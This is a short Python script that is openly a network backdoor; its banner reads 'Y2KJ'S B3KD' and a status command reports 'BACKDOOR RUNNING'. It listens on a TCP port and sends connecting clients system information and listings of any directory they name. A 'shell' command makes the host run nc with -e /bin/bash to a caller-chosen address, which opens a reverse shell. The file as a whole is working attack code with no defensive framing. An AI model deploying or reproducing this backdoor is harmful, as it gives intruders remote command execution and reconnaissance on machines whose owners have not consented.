import os
import sys
import socket
import platform
import subprocess
import pty
import pyfiglet





HOST='127.0.0.1'
PORT=5555

def getFiles(pPath):
	try:
		files=os.listdir(pPath)
		return files
	except FileNotFoundError:
		pass
def platformInfo():
	info=''
	info=info+str(platform.version())+str(platform.uname())+str(platform.system())+str(platform.processor())
	return info
def spawnShell(H,P):
	os.system(f'nc {H} {P} -e /bin/bash')



if __name__ == '__main__':
	banner = pyfiglet.figlet_format("Y2KJ'S B3KD")

	server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.bind((HOST,PORT))
	server.listen(10)
	while(True):
		conn,addr=server.accept()
		data=conn.recv(1024)
		print("Connected!")
		data=str(data,'utf-8')
		data=data.split()
		print(data)
		files = getFiles(data[0])
		conn.sendall(bytes(banner,'utf-8'))
		conn.sendall(bytes("Your Info-\n", 'utf-8'))
		conn.sendall(bytes(str(addr), 'utf-8'))
		conn.sendall(bytes("\n\n\nSystem Info-\n", 'utf-8'))
		conn.sendall(bytes(platformInfo() + '\n\n\n', "utf-8"))

		if data[0] == '0' or data[0] == 'exit' or data[0] == 'shutdown' or data[0] == 'stop' or data[0] == 'kill':
			conn.sendall(bytes("Server SHUTDOWN!","utf-8"))
			server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server.shutdown(socket.SHUT_RDWR)
			server.close()
			sys.exit()
		elif data[0] == 'shell':
			if len(data)==3:
				spawnShell(data[1],data[2])
			else:
				continue
		elif data[0] == 'status':
			conn.sendall(bytes("\n\n!!!BACKDOOR RUNNING!!!\n\n",'utf-8'))
		else:
			conn.sendall(bytes(f'Files in {data[0]}\n' + str(files), "utf-8"))











	
